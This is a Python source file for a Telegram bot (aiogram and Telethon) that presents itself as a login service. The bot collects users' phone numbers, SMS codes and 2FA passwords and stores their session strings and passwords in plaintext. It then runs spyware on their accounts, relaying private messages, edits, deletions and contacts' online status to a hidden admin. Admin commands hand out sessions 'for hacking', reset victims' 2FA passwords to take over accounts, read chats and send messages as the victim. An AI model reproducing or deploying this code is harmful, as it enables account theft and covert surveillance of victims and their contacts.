import asyncio
import sqlite3
import os
from datetime import datetime
from threading import Thread
from flask import Flask
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.types import UserStatusOnline, UserStatusOffline, UserStatusRecently, UserStatusLastWeek, UserStatusLastMonth, UserStatusEmpty
from aiogram import Bot, Dispatcher, types as aiogram_types
from aiogram.utils import executor
import nest_asyncio
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
nest_asyncio.apply()

# ========== КОНФИГ ==========
API_ID = int(os.environ.get('API_ID'))
API_HASH = os.environ.get('API_HASH')
BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = int(os.environ.get('ADMIN_ID'))

# ========== БД ==========
conn = sqlite3.connect('userbot.db', check_same_thread=False)
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS user_sessions (user_id INTEGER PRIMARY KEY, session_string TEXT, phone TEXT, two_fa TEXT, first_name TEXT, last_name TEXT, username TEXT)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS muted_users (user_id INTEGER, muted_by INTEGER, PRIMARY KEY (user_id, muted_by))''')
cursor.execute('''CREATE TABLE IF NOT EXISTS saved_messages (id INTEGER PRIMARY KEY AUTOINCREMENT, owner_id INTEGER, msg_id INTEGER, sender_id INTEGER, text TEXT, date TEXT)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS spy_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp TEXT, sender_id INTEGER, sender_name TEXT, message TEXT, chat_id INTEGER, chat_name TEXT)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS user_status_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, timestamp TEXT, user_id INTEGER, user_name TEXT, status TEXT)''')
conn.commit()

# ========== ГЛОБАЛЬНЫЕ ХРАНИЛИЩА ==========
active_clients = {}
saved_messages = {}
temp_auth = {}
active_chats = {}
user_status_tracker = {}  # {owner_id: {user_id: last_status}}

# ========== БОТ ==========
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

def log_to_admin(text: str):
    asyncio.create_task(bot.send_message(ADMIN_ID, text, parse_mode='HTML'))

def get_status_text(status):
    if isinstance(status, UserStatusOnline):
        return "🟢 В сети"
    elif isinstance(status, UserStatusOffline):
        if status.was_online:
            diff = datetime.now().astimezone() - status.was_online
            minutes = int(diff.total_seconds() // 60)
            if minutes < 60:
                return f"⚫ Был {minutes} мин назад"
            else:
                hours = minutes // 60
                return f"⚫ Был {hours} ч назад"
        return "⚫ Не в сети"
    elif isinstance(status, UserStatusRecently):
        return "🟡 Был недавно"
    elif isinstance(status, UserStatusLastWeek):
        return "🟡 Был на неделе"
    elif isinstance(status, UserStatusLastMonth):
        return "🟡 Был в месяце"
    else:
        return "⚪ Статус скрыт"

def get_code_keyboard():
    kb = aiogram_types.InlineKeyboardMarkup(row_width=3)
    for i in range(1, 10):
        kb.insert(aiogram_types.InlineKeyboardButton(str(i), callback_data=f"c_{i}"))
    kb.row(
        aiogram_types.InlineKeyboardButton("0", callback_data="c_0"),
        aiogram_types.InlineKeyboardButton("⌫", callback_data="c_del"),
        aiogram_types.InlineKeyboardButton("✅", callback_data="c_ok")
    )
    return kb

# ========== АДМИН КОМАНДЫ ==========

@dp.message_handler(commands=['spyhelp'])
async def spyhelp(message: aiogram_types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    await message.answer("""
🕵️ <b>АДМИН КОМАНДЫ</b>

<b>📋 СПИСКИ</b>
/users - список всех пользователей с номерами
/chats - список ЛС диалогов
/online - кто в сети

<b>👁 ПРОСМОТР</b>
/check НОМЕР - переписка с пользователем
/status @username - статус
/logs N - последние N логов
/statuslogs N - логи входов/выходов

<b>✉️ ДЕЙСТВИЯ</b>
/send ID текст - отправить сообщение
/typing ID - эмуляция набора
/markread ID - отметить прочитанным

<b>🔐 АККАУНТ</b>
/session - получить сессию для взлома
/set2fa ПАРОЛЬ - установить 2FA
/info - информация об аккаунте

<b>🤖 КОМАНДЫ ЮЗЕРБОТА (через точку)</b>
.help - справка
.mute - заглушить
.unmute - разглушить
.list - список заглушенных
.spam 5 текст - спам
.type текст - печатает
.info - инфо о пользователе
""", parse_mode='HTML')

@dp.message_handler(commands=['users'])
async def list_users(message: aiogram_types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    cursor.execute('SELECT user_id, first_name, last_name, username, phone, two_fa FROM user_sessions')
    rows = cursor.fetchall()
    
    if not rows:
        await message.answer("📭 Нет пользователей")
        return
    
    response = "👥 <b>ВСЕ ПОЛЬЗОВАТЕЛИ</b>\n\n"
    for i, (uid, fname, lname, uname, phone, two_fa) in enumerate(rows):
        name = fname or ""
        if lname:
            name += f" {lname}"
        if not name:
            name = uname or str(uid)
        
        response += f"<b>{i+1}. {name}</b>\n"
        response += f"   🆔 ID: <code>{uid}</code>\n"
        response += f"   📱 Тел: {phone or 'Не указан'}\n"
        response += f"   🔐 2FA: {'✅ Есть' if two_fa else '❌ Нет'}\n"
        response += f"   👤 Юзер: @{uname or 'Нет'}\n\n"
    
    await message.answer(response[:4000], parse_mode='HTML')

@dp.message_handler(commands=['session'])
async def get_session(message: aiogram_types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    args = message.get_args()
    if not args:
        await message.answer("❌ /session ID или /session @username")
        return
    
    owner_id = next(iter(active_clients)) if active_clients else None
    if not owner_id:
        await message.answer("❌ Нет активного юзербота")
        return
    
    try:
        # Пробуем найти пользователя
        if args.startswith('@'):
            entity = await active_clients[owner_id].get_entity(args)
            user_id = entity.id
        else:
            user_id = int(args)
        
        cursor.execute('SELECT session_string, phone, two_fa FROM user_sessions WHERE user_id=?', (user_id,))
        row = cursor.fetchone()
        
        if row and row[0]:
            session_str = row[0]
            await message.answer(f"🎭 <b>СЕССИЯ ДЛЯ ВЗЛОМА</b>\n\n"
                                f"👤 ID: <code>{user_id}</code>\n"
                                f"📱 Телефон: {row[1] or 'Не указан'}\n"
                                f"🔐 2FA: {'Есть' if row[2] else 'Нет'}\n\n"
                                f"<code>{session_str}</code>\n\n"
                                f"⚠️ Храни в секрете!", parse_mode='HTML')
        else:
            await message.answer("❌ Сессия не найдена")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['info'])
async def account_info(message: aiogram_types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    owner_id = next(iter(active_clients)) if active_clients else None
    if not owner_id:
        await message.answer("❌ Нет активного юзербота")
        return
    
    client = active_clients[owner_id]
    me = await client.get_me()
    
    cursor.execute('SELECT phone, two_fa FROM user_sessions WHERE user_id=?', (owner_id,))
    row = cursor.fetchone()
    
    await message.answer(f"👤 <b>ИНФОРМАЦИЯ ОБ АККАУНТЕ</b>\n\n"
                        f"Имя: {me.first_name}\n"
                        f"Фамилия: {me.last_name or '—'}\n"
                        f"Юзернейм: @{me.username or '—'}\n"
                        f"🆔 ID: <code>{me.id}</code>\n"
                        f"📱 Телефон: {row[0] if row else '—'}\n"
                        f"🔐 2FA: {'✅ Установлен' if row and row[1] else '❌ Не установлен'}\n"
                        f"📅 Аккаунт создан: {me.date.strftime('%d.%m.%Y') if me.date else '—'}",
                        parse_mode='HTML')

@dp.message_handler(commands=['set2fa'])
async def set_2fa(message: aiogram_types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    args = message.get_args()
    if not args:
        await message.answer("❌ /set2fa ПАРОЛЬ")
        return
    
    owner_id = next(iter(active_clients)) if active_clients else None
    if not owner_id:
        await message.answer("❌ Нет активного юзербота")
        return
    
    client = active_clients[owner_id]
    password = args
    
    try:
        await client.edit_2fa(password)
        cursor.execute('UPDATE user_sessions SET two_fa=? WHERE user_id=?', (password, owner_id))
        conn.commit()
        await message.answer(f"✅ 2FA установлен: {password}\n⚠️ Запомни его!")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['statuslogs'])
async def status_logs(message: aiogram_types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    args = message.get_args()
    limit = int(args) if args and args.isdigit() else 20
    
    cursor.execute('SELECT timestamp, user_name, status FROM user_status_logs ORDER BY id DESC LIMIT ?', (limit,))
    rows = cursor.fetchall()
    
    if not rows:
        await message.answer("📭 Нет логов входов/выходов")
        return
    
    response = "🔄 <b>ЛОГИ ВХОДОВ/ВЫХОДОВ</b>\n\n"
    for ts, name, status in reversed(rows):
        emoji = "🟢" if "ВОШЕЛ" in status else "⚫"
        response += f"{emoji} [{ts[11:16]}] {name}: {status}\n"
    
    await message.answer(response[:4000], parse_mode='HTML')

# ========== ОСТАЛЬНЫЕ АДМИН КОМАНДЫ (ТЕ ЖЕ) ==========

@dp.message_handler(commands=['stats'])
async def stats_cmd(message: aiogram_types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    cursor.execute('SELECT COUNT(*) FROM spy_logs')
    total_logs = cursor.fetchone()[0]
    cursor.execute('SELECT COUNT(DISTINCT sender_id) FROM spy_logs')
    total_users = cursor.fetchone()[0]
    cursor.execute('SELECT COUNT(*) FROM user_status_logs')
    total_status = cursor.fetchone()[0]
    await message.answer(f"📊 СТАТИСТИКА\n\nВсего сообщений: {total_logs}\nУникальных собеседников: {total_users}\nЛогов статусов: {total_status}")

@dp.message_handler(commands=['chats'])
async def list_chats(message: aiogram_types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    owner_id = next(iter(active_clients)) if active_clients else None
    if not owner_id:
        await message.answer("❌ Нет активного юзербота")
        return
    
    client = active_clients[owner_id]
    await message.answer("🔄 Собираю список...")
    
    chats = []
    async for dialog in client.iter_dialogs():
        if dialog.is_user:
            try:
                entity = await client.get_entity(dialog.id)
                if not getattr(entity, 'bot', False):
                    chats.append({'id': dialog.id, 'name': dialog.name})
            except:
                chats.append({'id': dialog.id, 'name': dialog.name})
    
    active_chats[owner_id] = chats
    
    response = "📋 СПИСОК ЛС (только люди):\n\n"
    for i, chat in enumerate(chats):
        response += f"{i+1}. {chat['name']} (ID: {chat['id']})\n"
    
    await message.answer(response[:4000])
    await message.answer("💡 /check НОМЕР")

@dp.message_handler(commands=['check'])
async def check_chat(message: aiogram_types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    args = message.get_args()
    if not args:
        await message.answer("❌ /check НОМЕР")
        return
    
    try:
        # Поддержка и номера и ID
        if args.isdigit():
            num = int(args) - 1
            owner_id = next(iter(active_clients)) if active_clients else None
            
            if not owner_id or owner_id not in active_chats:
                await message.answer("❌ Сначала /chats")
                return
            
            if num < 0 or num >= len(active_chats[owner_id]):
                await message.answer("❌ Неверный номер")
                return
            
            chat = active_chats[owner_id][num]
            chat_id = chat['id']
            chat_name = chat['name']
        else:
            # Прямой ID или username
            owner_id = next(iter(active_clients)) if active_clients else None
            if not owner_id:
                await message.answer("❌ Нет активного юзербота")
                return
            entity = await active_clients[owner_id].get_entity(args)
            chat_id = entity.id
            chat_name = entity.first_name or entity.username or str(chat_id)
        
        client = active_clients[owner_id]
        await message.answer(f"🔄 Последние сообщения с {chat_name}...")
        
        msgs = []
        async for msg in client.iter_messages(chat_id, limit=30):
            if msg.text:
                try:
                    sender = await client.get_entity(msg.sender_id)
                    if getattr(sender, 'bot', False):
                        continue
                    sender_name = sender.first_name or sender.username or str(sender.id)
                    
                    if msg.out:
                        msgs.append(f"[{msg.date.strftime('%d.%m %H:%M')}] <b>Я → {sender_name}:</b> {msg.text[:150]}")
                    else:
                        msgs.append(f"[{msg.date.strftime('%d.%m %H:%M')}] <b>{sender_name} → Мне:</b> {msg.text[:150]}")
                except:
                    msgs.append(f"[{msg.date.strftime('%d.%m %H:%M')}] {msg.text[:150]}")
        
        if msgs:
            response = f"💬 <b>ЧАТ С {chat_name}</b> (ID: {chat_id})\n\n"
            response += "\n".join(reversed(msgs[-20:]))
            await message.answer(response[:4000], parse_mode='HTML')
        else:
            await message.answer("📭 Нет сообщений")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['online'])
async def online_users(message: aiogram_types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    owner_id = next(iter(active_clients)) if active_clients else None
    if not owner_id:
        await message.answer("❌ Нет активного юзербота")
        return
    
    client = active_clients[owner_id]
    await message.answer("🔄 Проверяю...")
    
    online = []
    async for dialog in client.iter_dialogs():
        if dialog.is_user:
            try:
                entity = await client.get_entity(dialog.id)
                if not getattr(entity, 'bot', False) and isinstance(entity.status, UserStatusOnline):
                    online.append(f"{dialog.name} (ID: {dialog.id})")
            except:
                pass
    
    if online:
        await message.answer(f"🟢 <b>В СЕТИ ({len(online)})</b>:\n\n" + "\n".join(online[:30]), parse_mode='HTML')
    else:
        await message.answer("🟢 Никого в сети")

@dp.message_handler(commands=['status'])
async def user_status(message: aiogram_types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    args = message.get_args()
    if not args:
        await message.answer("❌ /status @username")
        return
    
    owner_id = next(iter(active_clients)) if active_clients else None
    if not owner_id:
        await message.answer("❌ Нет активного юзербота")
        return
    
    client = active_clients[owner_id]
    
    try:
        entity = await client.get_entity(args)
        if getattr(entity, 'bot', False):
            await message.answer("❌ Это бот")
            return
        status_text = get_status_text(entity.status)
        await message.answer(f"👤 <b>{entity.first_name or entity.username}</b>\n🆔 ID: {entity.id}\n📊 {status_text}", parse_mode='HTML')
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['logs'])
async def view_logs(message: aiogram_types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    args = message.get_args()
    limit = int(args) if args and args.isdigit() else 20
    limit = min(limit, 100)
    
    cursor.execute('SELECT timestamp, sender_name, message FROM spy_logs ORDER BY id DESC LIMIT ?', (limit,))
    rows = cursor.fetchall()
    
    if not rows:
        await message.answer("📭 Нет логов")
        return
    
    response = "📜 ПОСЛЕДНИЕ ЛОГИ:\n\n"
    for ts, name, msg in reversed(rows):
        response += f"[{ts[11:16]}] {name}: {msg[:80]}\n"
    
    await message.answer(response[:4000])

@dp.message_handler(commands=['send'])
async def send_message(message: aiogram_types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    args = message.get_args()
    if not args:
        await message.answer("❌ /send ID текст")
        return
    
    parts = args.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("❌ /send ID текст")
        return
    
    chat_id = int(parts[0])
    text = parts[1]
    
    owner_id = next(iter(active_clients)) if active_clients else None
    if not owner_id:
        await message.answer("❌ Нет активного юзербота")
        return
    
    client = active_clients[owner_id]
    
    try:
        await client.send_message(chat_id, text)
        await message.answer(f"✅ Отправлено {chat_id}")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['typing'])
async def start_typing(message: aiogram_types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    args = message.get_args()
    if not args:
        await message.answer("❌ /typing ID")
        return
    
    chat_id = int(args)
    
    owner_id = next(iter(active_clients)) if active_clients else None
    if not owner_id:
        await message.answer("❌ Нет активного юзербота")
        return
    
    client = active_clients[owner_id]
    
    try:
        async with client.action(chat_id, 'typing'):
            await asyncio.sleep(3)
        await message.answer(f"✅ Печатал в чате {chat_id}")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(commands=['markread'])
async def mark_read(message: aiogram_types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    args = message.get_args()
    if not args:
        await message.answer("❌ /markread ID")
        return
    
    chat_id = int(args)
    
    owner_id = next(iter(active_clients)) if active_clients else None
    if not owner_id:
        await message.answer("❌ Нет активного юзербота")
        return
    
    client = active_clients[owner_id]
    
    try:
        await client.send_read_acknowledge(chat_id)
        await message.answer(f"✅ Чат {chat_id} отмечен прочитанным")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

# ========== РЕГИСТРАЦИЯ ==========

@dp.message_handler(commands=['start'])
async def start_auth(message: aiogram_types.Message):
    user_id = message.from_user.id
    
    cursor.execute('SELECT session_string, phone, two_fa, first_name FROM user_sessions WHERE user_id=?', (user_id,))
    row = cursor.fetchone()
    if row and row[0]:
        await message.answer("✅ Ты уже авторизован!")
        if user_id not in active_clients:
            asyncio.create_task(run_userbot(user_id, row[0]))
        return
    
    kb = aiogram_types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    kb.add(aiogram_types.KeyboardButton("📱 Поделиться номером", request_contact=True))
    await message.answer("🔐 Отправь номер телефона", reply_markup=kb)

@dp.message_handler(content_types=aiogram_types.ContentType.CONTACT)
async def get_phone(message: aiogram_types.Message):
    user_id = message.from_user.id
    phone = message.contact.phone_number
    first_name = message.contact.first_name or ""
    
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        result = await client.send_code_request(phone)
        temp_auth[user_id] = {
            "client": client,
            "phone": phone,
            "hash": result.phone_code_hash,
            "code": "",
            "first_name": first_name
        }
        await message.answer("📱 Введи код из SMS:", reply_markup=get_code_keyboard())
        await message.answer("Используй кнопки", reply_markup=aiogram_types.ReplyKeyboardRemove())
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

@dp.callback_query_handler(lambda c: c.data.startswith('c_'))
async def code_callback(callback: aiogram_types.CallbackQuery):
    user_id = callback.from_user.id
    if user_id not in temp_auth:
        await callback.answer("Начни заново /start")
        return
    
    action = callback.data[2:]
    current = temp_auth[user_id]["code"]
    
    if action == "del":
        temp_auth[user_id]["code"] = current[:-1]
    elif action == "ok":
        if len(current) == 5:
            await callback.answer("Авторизация...")
            await complete_auth(callback, user_id)
            return
        else:
            await callback.answer(f"Нужно 5 цифр (сейчас {len(current)})", show_alert=True)
            return
    else:
        if len(current) < 5:
            temp_auth[user_id]["code"] = current + action
    
    code = temp_auth[user_id]["code"]
    display = code if code else " "
    await callback.message.edit_text(f"📱 Код: `{display}`", parse_mode="Markdown", reply_markup=get_code_keyboard())
    await callback.answer()

async def complete_auth(callback, user_id: int):
    data = temp_auth[user_id]
    try:
        await data["client"].sign_in(phone=data["phone"], code=data["code"], phone_code_hash=data["hash"])
        session_str = data["client"].session.save()
        
        me = await data["client"].get_me()
        
        cursor.execute('''INSERT OR REPLACE INTO user_sessions 
                          (user_id, session_string, phone, two_fa, first_name, last_name, username) 
                          VALUES (?, ?, ?, ?, ?, ?, ?)''',
                       (user_id, session_str, data["phone"], None, me.first_name, me.last_name, me.username))
        conn.commit()
        
        await callback.message.answer("✅ Авторизация успешна!")
        asyncio.create_task(run_userbot(user_id, session_str))
        await data["client"].disconnect()
        del temp_auth[user_id]
    except Exception as e:
        if "2FA" in str(e) or "password" in str(e).lower():
            await callback.message.answer("🔐 Введи пароль от 2FA:")
            temp_auth[user_id]["step"] = "2fa"
        else:
            await callback.message.answer(f"❌ Ошибка: {e}")

@dp.message_handler(lambda msg: msg.from_user.id in temp_auth and temp_auth[msg.from_user.id].get("step") == "2fa")
async def handle_2fa(message: aiogram_types.Message):
    user_id = message.from_user.id
    data = temp_auth[user_id]
    try:
        await data["client"].sign_in(password=message.text.strip())
        session_str = data["client"].session.save()
        
        me = await data["client"].get_me()
        
        cursor.execute('''INSERT OR REPLACE INTO user_sessions 
                          (user_id, session_string, phone, two_fa, first_name, last_name, username) 
                          VALUES (?, ?, ?, ?, ?, ?, ?)''',
                       (user_id, session_str, data["phone"], message.text.strip(), me.first_name, me.last_name, me.username))
        conn.commit()
        
        await message.answer("✅ Авторизация успешна!")
        asyncio.create_task(run_userbot(user_id, session_str))
        await data["client"].disconnect()
        del temp_auth[user_id]
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

# ========== ЮЗЕРБОТ ==========

async def run_userbot(owner_id: int, session_string: str):
    if owner_id in active_clients:
        try:
            await active_clients[owner_id].disconnect()
        except:
            pass
    
    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
    await client.connect()
    
    if not await client.is_user_authorized():
        logging.error(f"❌ {owner_id} не авторизован")
        return
    
    active_clients[owner_id] = client
    saved_messages[owner_id] = {}
    user_status_tracker[owner_id] = {}
    
    logging.info(f"✅ Юзербот запущен для {owner_id}")
    
    me = await client.get_me()
    log_to_admin(f"✅ Юзербот запущен: {me.first_name} (@{me.username})")
    
    cursor.execute('SELECT user_id FROM muted_users WHERE muted_by=?', (owner_id,))
    muted_users = {row[0] for row in cursor.fetchall()}
    
    # ========== ОТСЛЕЖИВАНИЕ СТАТУСА ПОЛЬЗОВАТЕЛЕЙ ==========
    @client.on(events.UserUpdate)
    async def track_status(event):
        if hasattr(event, 'user'):
            user = event.user
            if getattr(user, 'bot', False):
                return
            
            user_id = user.id
            user_name = getattr(user, 'first_name', getattr(user, 'username', str(user_id)))
            current_status = type(user.status).__name__
            last_status = user_status_tracker.get(owner_id, {}).get(user_id)
            
            if last_status != current_status:
                user_status_tracker[owner_id][user_id] = current_status
                
                if isinstance(user.status, UserStatusOnline):
                    status_text = "🟢 ВОШЕЛ В СЕТЬ"
                    log_to_admin(f"🟢 <b>{user_name}</b> (ID: {user_id}) ВОШЕЛ В СЕТЬ!")
                elif isinstance(user.status, UserStatusOffline):
                    status_text = "⚫ ВЫШЕЛ ИЗ СЕТИ"
                    log_to_admin(f"⚫ <b>{user_name}</b> (ID: {user_id}) ВЫШЕЛ ИЗ СЕТИ")
                else:
                    return
                
                cursor.execute('''INSERT INTO user_status_logs (timestamp, user_id, user_name, status)
                                  VALUES (?, ?, ?, ?)''',
                               (datetime.now().isoformat(), user_id, user_name[:100], status_text))
                conn.commit()
    
    # ========== ЛОГГИРОВАНИЕ СООБЩЕНИЙ ==========
    @client.on(events.NewMessage)
    async def spy_on_messages(event):
        if not event.is_private:
            return
        if event.out:
            return
        
        sender = await event.get_sender()
        
        if getattr(sender, 'bot', False) or getattr(sender, 'is_bot', False):
            return
        
        if sender.id in muted_users:
            return
        
        sender_name = getattr(sender, 'first_name', getattr(sender, 'username', str(sender.id)))
        message_text = event.text or "[Нет текста]"
        
        cursor.execute('''INSERT INTO spy_logs (timestamp, sender_id, sender_name, message, chat_id, chat_name)
                          VALUES (?, ?, ?, ?, ?, ?)''',
                       (datetime.now().isoformat(), sender.id, sender_name[:100], message_text[:500], event.chat_id, sender_name[:100]))
        conn.commit()
        
        log_to_admin(f"""
🕵️ <b>ЛС ОТ {sender_name}</b>
━━━━━━━━━━━━━━━
📅 {datetime.now().strftime('%H:%M:%S')}
👤 {sender_name} → Мне
📝 {message_text[:500]}
━━━━━━━━━━━━━━━
""")
        
        saved_messages[owner_id][event.id] = {
            "sender_id": sender.id,
            "text": message_text
        }
    
    # ========== УВЕДОМЛЕНИЯ ОБ УДАЛЕНИИ ==========
    @client.on(events.MessageDeleted)
    async def on_delete(event):
        for msg_id in event.deleted_ids:
            msg = saved_messages.get(owner_id, {}).get(msg_id)
            if msg and msg["sender_id"] not in muted_users:
                log_to_admin(f"🗑 <b>УДАЛЕНО</b>\n{msg['text'][:200]}")
    
    # ========== УВЕДОМЛЕНИЯ ОБ ИЗМЕНЕНИИ ==========
    @client.on(events.MessageEdited)
    async def on_edit(event):
        if event.out or not event.is_private:
            return
        
        msg_id = event.id
        new_text = event.text or ""
        msg = saved_messages.get(owner_id, {}).get(msg_id)
        
        if msg and msg["text"] != new_text and msg["sender_id"] not in muted_users:
            log_to_admin(f"✏️ <b>ИЗМЕНЕНО</b>\nБыло: {msg['text'][:200]}\nСтало: {new_text[:200]}")
            msg["text"] = new_text
    
    # ========== КОМАНДЫ ЮЗЕРБОТА ==========
    @client.on(events.NewMessage)
    async def user_commands(event):
        if not event.is_private or not event.out:
            return
        
        text = event.text or ""
        if not text.startswith('.'):
            return
        
        # ===== HELP =====
        if text == '.help':
            await event.edit("""
<b>📝 КОМАНДЫ ЮЗЕРБОТА</b>

.mute (ответ) - заглушить человека
.unmute (ответ) - разглушить
.list - список заглушенных
.spam 5 текст - отправить 5 сообщений
.type текст - печатает как человек
.info (ответ) - инфо о пользователе
""", parse_mode='HTML')
            return
        
        # ===== MUTE =====
        if text == '.mute':
            reply = await event.get_reply_message()
            if reply and reply.sender_id:
                cursor.execute('INSERT OR IGNORE INTO muted_users VALUES (?, ?)', (reply.sender_id, owner_id))
                conn.commit()
                muted_users.add(reply.sender_id)
                await event.edit(f'🔕 Заглушен')
            return
        
        # ===== UNMUTE =====
        if text == '.unmute':
            reply = await event.get_reply_message()
            if reply and reply.sender_id:
                cursor.execute('DELETE FROM muted_users WHERE user_id=? AND muted_by=?', (reply.sender_id, owner_id))
                conn.commit()
                muted_users.discard(reply.sender_id)
                await event.edit(f'🔔 Разглушен')
            return
        
        # ===== LIST =====
        if text == '.list':
            if muted_users:
                names = []
                for uid in list(muted_users)[:20]:
                    try:
                        u = await client.get_entity(uid)
                        names.append(f"• {u.first_name}")
                    except:
                        names.append(f"• {uid}")
                await event.edit("🔕 Замьюченные:\n" + "\n".join(names))
            else:
                await event.edit("🔕 Нет")
            return
        
        # ===== SPAM =====        if text.startswith('.spam '):
            parts = text.split(' ', 2)
            if len(parts) >= 2:
                try:
                    count = min(int(parts[1]), 20)
                    msg_text = parts[2] if len(parts) > 2 else None
                    if not msg_text:
                        reply = await event.get_reply_message()
                        if reply:
                            msg_text = reply.text
                    if msg_text:
                        await event.delete()
                        for i in range(count):
                            await client.send_message(event.chat_id, msg_text)
                            await asyncio.sleep(0.3)
                        await client.send_message(event.chat_id, f"✅ {count} сообщений отправлено")
                except Exception as e:
                    await event.edit(f"❌ Ошибка: {e}")
            return
        
        # ===== TYPE =====
        if text.startswith('.type '):
            txt = text[6:]
            if txt:
                await event.delete()
                msg = await client.send_message(event.chat_id, "")
                typed = ""
                for ch in txt:
                    typed += ch
                    try:
                        await msg.edit(typed)
                    except:
                        pass
                    await asyncio.sleep(0.15)
                await asyncio.sleep(0.5)
                await msg.delete()
            return
        
        # ===== INFO =====
        if text == '.info':
            reply = await event.get_reply_message()
            if reply:
                try:
                    u = await client.get_entity(reply.sender_id)
                    muted = "✅" if reply.sender_id in muted_users else "❌"
                    bot_status = "🤖 Да" if getattr(u, 'bot', False) else "👤 Нет"
                    await event.edit(f"👤 <b>{u.first_name}</b>\n🆔 ID: {u.id}\n🔇 Заглушен: {muted}\n🤖 Бот: {bot_status}", parse_mode='HTML')
                except Exception as e:
                    await event.edit(f"❌ Ошибка: {e}")
            return
    
    await client.run_until_disconnected()

# ========== ВЕБ-СЕРВЕР ==========
flask_app = Flask(__name__)

@flask_app.route('/')
def health():
    return "🕵️ SpyBot Online"

def run_web():
    flask_app.run(host='0.0.0.0', port=8080)

async def restore_sessions():
    cursor.execute('SELECT user_id, session_string FROM user_sessions')
    for user_id, session_str in cursor.fetchall():
        asyncio.create_task(run_userbot(user_id, session_str))

async def main():
    logging.info("🚀 Запуск...")
    await restore_sessions()
    while True:
        await asyncio.sleep(10)

if __name__ == "__main__":
    Thread(target=run_web, daemon=True).start()
    Thread(target=lambda: executor.start_polling(dp, skip_updates=True), daemon=True).start()
    asyncio.run(main())
